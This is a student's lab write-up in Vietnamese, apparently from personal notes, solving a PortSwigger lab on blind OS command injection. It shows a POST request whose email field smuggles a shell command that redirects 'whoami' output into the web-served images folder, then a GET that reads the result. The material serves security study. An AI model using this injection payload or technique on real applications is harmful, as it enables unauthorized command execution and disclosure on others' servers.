![[lab-os-command-redirect.png]]
lab blind nhưng redirect output ra file ảnh rồi GET lại.

> [!NOTE] phân tích đề
> giống lab blind time, không thấy output.
> nhưng app serve static ở `/var/www/images`.
> nên mình ghi output vào đó rồi GET ra.
> biến blind thành in-band.

### hướng giải
- [ ] confirm blind bằng ping delay trước
- [ ] chèn `whoami > /var/www/images/output.txt`
- [ ] GET `/images/output.txt` đọc kết quả
- [ ] nếu 404 thì thử tên khác hoặc path khác

### giải
mình chèn redirect:

```http
POST /feedback/submit HTTP/1.1
Host: 0a7b55c808gcxxxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 85

email=&+whoami+>+/var/www/images/output.txt+&&message=hello
```

-> server chạy `whoami` rồi ghi vào `output.txt`.
=> sau đó mình GET:

```http
GET /images/output.txt HTTP/1.1
Host: 0a7b55c808gcxxxx.web-security-academy.net
```

response:

```text
peter
```

-> `peter` là user chạy app.
=> solved.
-> nếu file cũ còn thì xóa hoặc đổi tên `test123.txt` cho chắc.

liên quan:
- [[lys thuyet OS command injection]]
- [[injection command]]
- [[Lab-OS command blind time]]
- [[Lab-OS command simple]]

> [!NOTE] bài học
> sau khi quan sát lab này mình thấy...
> redirect `>` là cách biến blind thành đọc được.
> nên mình khi gặp blind luôn check webroot ở đâu.
> `/var/www/images` là chỗ PortSwigger hay cho ghi nhất.
